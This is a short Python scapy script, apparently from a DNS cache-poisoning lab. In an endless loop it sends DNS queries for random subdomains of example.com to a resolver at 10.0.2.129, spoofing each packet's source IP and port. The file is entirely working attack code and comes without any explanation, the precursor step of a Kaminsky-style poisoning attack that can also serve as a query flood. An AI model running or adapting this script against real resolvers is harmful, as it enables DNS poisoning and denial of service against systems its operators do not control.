#!/usr/bin/python3

from scapy.all import *
import random
import string

while True:

  random_ip = "10.0.2." + str(random.randint(0, 2**8-1))
  random_port = random.randint(0, 2**16-1)
  random_prefix = ""
  for i in range(5):
    random_prefix += random.choice(string.ascii_letters)
  random_qname = random_prefix + ".example.com"

  Qdsec = DNSQR(qname=random_qname)
  dns = DNS(id=0xAAAA, qr=0, qdcount=1, ancount=0, nscount=0, arcount=0, qd=Qdsec)
  ip = IP(dst='10.0.2.129', src=random_ip)
  udp = UDP(dport=53, sport=random_port, chksum=0)
  request = ip/udp/dns

  send(request)

